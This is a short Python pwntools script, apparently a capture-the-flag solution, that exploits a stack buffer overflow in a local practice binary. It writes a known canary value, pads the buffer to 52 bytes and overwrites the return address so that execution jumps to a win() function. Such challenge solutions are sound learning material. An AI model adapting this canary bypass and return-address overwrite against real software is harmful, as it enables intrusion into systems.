#!/usr/bin/env python

#file run from server and placed in ~/get_flag.py

from pwn import *

context.log_level = 'critical'

payload = 'a'*32
canary = 'h_?='
payload += canary

#we know we need 52 bytes then return
payload += 'A'*(52-len(payload))

#address of win() function
#return address: 0x80486eb
payload += '\xeb\x86\x04\x08'

print len(payload)
p = process('./vuln')
p.sendline(str(len(payload)))
p.sendline(payload)
ans=p.recvall()
print ans

